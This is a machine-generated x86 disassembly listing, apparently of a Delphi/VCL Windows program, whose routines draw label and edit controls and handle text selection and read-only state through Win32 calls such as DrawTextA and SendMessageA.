test bl bl
je r-xdata
je r-xdata
lodsb [ esi ]
scasb [ edi ]
inc ecx
add [ esp + ebp * 4 - 0x4f1bffbf ] ch
inc ecx
inc esp
outsd
add [ ebx + 0x53000408 ] ch
push esi
imul ebp [ esi + 0x67 ] 0x43f87c73
add [ esi + eax * 4 ] bh
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c80c
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
add [ ebx + 0x56 ] dl
inc ebx
je r-xdata
call sub_424494
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4243f0
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
push ebx
push 0x208838b
add [ eax ] al
insb
jae r-xdata
add [ ebx - 0x7ba9ac40 ] cl
shl [ eax + ecx - 0x7d ] cl
sub_43f938
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4524a0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_449774
mov edx 0x69
mov eax esi
call sub_449798
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_43f994
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c80c
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_424494
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4243f0
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43fa00
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43fda2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_424494
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_4243f0
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_449fb8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_41919c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x54 ]
call sub_404264
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x58 ]
call sub_404464
push eax
mov eax edi
call sub_424598
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_41919c
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_423c94
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_423c94
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4240f0
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_423c94
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_424598
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fda9
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403fc8
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x60 ]
call sub_4046b0
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403fc8
retn
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4240f0
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_449fb8
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_4243d4
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_41919c
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_41919c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4047fc
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43acbc
jmp r-xdata
call sub_43a9dc
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43ad20
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43abc8
push 0x0
mov eax edi
call sub_424598
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_449fb8
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44c298
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x80 ]
call sub_404264
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x84 ]
call sub_404464
push eax
mov eax edi
call sub_424598
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_423c94
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x88 ]
call sub_404264
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x8c ]
call sub_404464
push eax
mov eax edi
call sub_424598
push eax
call DrawTextA
sub_43fdb3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fe2e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_461d58
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fc24
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax ebx
call sub_450d38
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fe35
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_43fe80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451a20
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_449774
mov edx 0x11
mov eax esi
call sub_449798
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43ff2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440082
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c298
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_424494
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40426c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404264
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x160 ]
call sub_424598
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4234a8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404264
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x160 ]
call sub_424598
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4234a8
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404264
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
mov eax [ ebx + 0x160 ]
call sub_424598
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440089
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_440093
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4402bc
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_423db0
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_423c94
xor edx edx
mov eax [ esi + 0x14 ]
call sub_423db0
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_4240b4
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403450
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403450
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_4401b4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_424618
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403450
xor edx edx
mov eax [ edi + 0x160 ]
call sub_424618
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403450
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_446d44
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_4402f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4402bc
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440358
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403450
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440380
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_449488
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_4403e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440471
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440478
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_461d58
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_4404c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44c4cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_449774
mov edx 0x19
mov eax esi
call sub_449798
mov dl 0x1
mov eax esi
call sub_450a0c
xor edx edx
mov eax esi
call sub_44a17c
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_440bf4
mov eax esi
test bl bl
je r-xdata
sub_440570
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4405f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_450adc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_440634
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_450adc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4507d8
push eax
call SendMessageA
test eax eax
setne bl
sub_44066c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_450adc
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4507d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4406a4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440721
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440728
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_450adc
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_449fb8
mov eax [ ebp - 0x4 ]
call sub_404464
mov edx eax
mov eax ebx
call sub_449f94
sub_44072c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_450adc
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4507d8
push eax
call SendMessageA
sub_440768
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_44078c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4407ac
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_4407dc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_440894
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_449f2c
inc eax
call sub_408de0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44091e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408df4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_449f3c
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440925
mov eax [ ebp - 0xc ]
call sub_408e2c
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_440930
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404094
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_449f2c
inc eax
call sub_408de0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4409be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408df4
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_449f3c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4029c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408e2c
retn
sub_4409cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d62c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44d558
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_440a85
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_44d928
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_44d928
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_440af8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_440b37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44d758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b3e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_440b3e
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_44066c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440bb8
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SendMessageA
sub_440bb8
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_440bf4
pop ebx
retn
sub_440bf4
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_4234bc
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_449798
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_440cc0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_44e318
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_440cf8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4507d8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4507d8
push eax
call SendMessageA
sub_440d38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fdb8
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_440bb8
mov eax ebx
call sub_44dd40
sub_440d6c
push ebx
mov ebx eax
mov eax ebx
call sub_44fcfc
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_440bf4
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_440db4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44fb54
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
